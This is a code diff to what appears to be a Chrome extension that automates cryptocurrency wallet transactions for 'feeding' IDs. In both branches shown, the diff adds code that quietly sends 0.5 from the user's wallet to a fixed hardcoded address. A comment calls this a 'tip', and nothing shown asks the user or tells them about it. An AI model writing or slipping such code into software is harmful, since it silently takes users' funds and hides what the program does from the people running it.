@@ -77,11 +77,19 @@ chrome.extension.onRequest.addListener(
                 } else {
                     num = num + idNum
                 }
-                sendTransacation(wallet, to_address, num).then(Transacation => {
-                    console.log(Transacation)
-                }, err => {
-                    alert(err)
-                })
+                const looper = async function () {
+                    try {
+                        const Transacation = await sendTransacation(wallet, to_address, num)
+                        console.log(Transacation)
+                        await sleep(1000)
+                        // 打赏
+                        sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
+                    } catch (err) {
+                        throw err
+                    }
+                }
+                looper()
+
             } else {
                 console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")
                 function sleep(ms) {
@@ -96,8 +104,9 @@ chrome.extension.onRequest.addListener(
                         } catch (err) {
                             throw err
                         }
-
                     }
+                    // 打赏
+                    sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                 }
                 looper()
 
